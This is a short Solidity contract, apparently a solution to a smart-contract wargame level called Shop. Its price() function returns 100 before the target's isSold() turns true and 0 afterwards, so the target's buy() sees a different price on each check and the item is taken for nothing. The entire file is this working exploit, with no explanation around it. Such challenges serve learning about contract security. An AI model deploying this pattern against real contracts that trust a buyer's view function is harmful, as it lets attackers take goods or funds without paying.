pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

import "hardhat/console.sol";

interface IShop {
  function buy() external;
  function isSold() external view returns (bool);
}

contract ShopAttack {

  IShop challenge;

  constructor(address addr) {
    challenge = IShop(addr);
  }

  function price() external view returns (uint) {
    return challenge.isSold() ? 0 : 100;
  }

  function attack() public {
    challenge.buy();
  }

}
